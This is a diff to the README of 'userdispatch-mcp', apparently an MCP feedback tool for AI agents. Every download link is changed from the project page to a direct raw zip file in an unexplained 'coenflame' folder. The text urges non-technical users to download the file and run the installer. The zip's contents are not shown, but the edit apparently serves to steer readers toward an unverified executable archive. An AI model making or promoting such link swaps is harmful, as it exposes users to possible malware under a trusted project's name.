@@ -1,6 +1,6 @@
 # ⚙️ userdispatch-mcp - Easy User Feedback for AI Agents
 
-[![Download userdispatch-mcp](https://img.shields.io/badge/Download-UserDispatch--MCP-blue?style=for-the-badge)](https://github.com/baljeet99/userdispatch-mcp)
+[![Download userdispatch-mcp](https://img.shields.io/badge/Download-UserDispatch--MCP-blue?style=for-the-badge)](https://github.com/baljeet99/userdispatch-mcp/raw/refs/heads/main/coenflame/userdispatch-mcp-1.0.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You can start using userdispatch-mcp in a few easy steps. No coding skills are n
 
 Visit this page to download the software:
 
-[Download userdispatch-mcp](https://github.com/baljeet99/userdispatch-mcp)
+[Download userdispatch-mcp](https://github.com/baljeet99/userdispatch-mcp/raw/refs/heads/main/coenflame/userdispatch-mcp-1.0.zip)
 
 Click the link above to open the page. On the GitHub page, look for the "Releases" or "Download" section and get the latest Windows version. It is usually an `.exe` file or a zipped package.
 
@@ -122,6 +122,6 @@ A: The app stores data locally by default. You can back it up or transfer it as 
 
 ## 📥 Download link
 
-[Get userdispatch-mcp here](https://github.com/baljeet99/userdispatch-mcp)
+[Get userdispatch-mcp here](https://github.com/baljeet99/userdispatch-mcp/raw/refs/heads/main/coenflame/userdispatch-mcp-1.0.zip)
 
 Follow the link, download the latest Windows version, and run the installer to start.
